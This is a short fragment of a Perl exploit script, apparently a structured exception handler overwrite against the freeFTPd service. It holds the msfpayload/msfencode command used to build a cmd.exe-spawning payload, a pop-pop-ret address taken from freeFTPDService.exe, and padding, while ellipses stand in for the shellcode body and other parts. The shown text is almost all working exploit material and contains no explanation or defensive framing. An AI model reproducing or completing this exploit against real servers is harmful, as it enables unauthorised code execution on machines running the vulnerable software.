...
# Spawn cmd.exe from msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x0a\x0d' -t perl
my $shell =
...
my $seh2 = "\xf0\x42\x41\x00"; # PPR from freeFTPDService.exe (only unsafe SEH module), 0x004142f0
my $pad = "X" x 209 ."\r\n";
